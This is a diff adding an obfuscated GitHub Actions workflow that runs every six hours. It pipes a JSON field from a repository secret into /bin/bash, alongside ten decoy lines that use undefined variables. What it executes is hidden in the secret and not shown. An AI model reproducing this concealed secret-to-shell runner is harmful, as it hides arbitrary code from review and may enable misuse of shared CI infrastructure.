@@ -1,0 +1,28 @@
+name: lingyiweiyangg
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '15 0/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: lingyiweiyangg
+        env:
+          qgowu382: ${{ secrets.qgowu382 }}
+        run: |
+          echo $qgowu382 | jq -r .aro2888 | /bin/bash
+          echo $y8317 | jq -r .pmw4370 | /bin/bash
+          echo $wmph7 | jq -r .ciqjq855 | /bin/bash
+          echo $uxm72 | jq -r .zdpn53 | /bin/bash
+          echo $sir867 | jq -r .gkx770 | /bin/bash
+          echo $l77 | jq -r .wk6440 | /bin/bash
+          echo $vv1554 | jq -r .tq44929 | /bin/bash
+          echo $cd710 | jq -r .eexk28220 | /bin/bash
+          echo $jht244 | jq -r .gu84790 | /bin/bash
+          echo $osya56170 | jq -r .m10 | /bin/bash
+          echo $k9288 | jq -r .hxa573 | /bin/bash
+
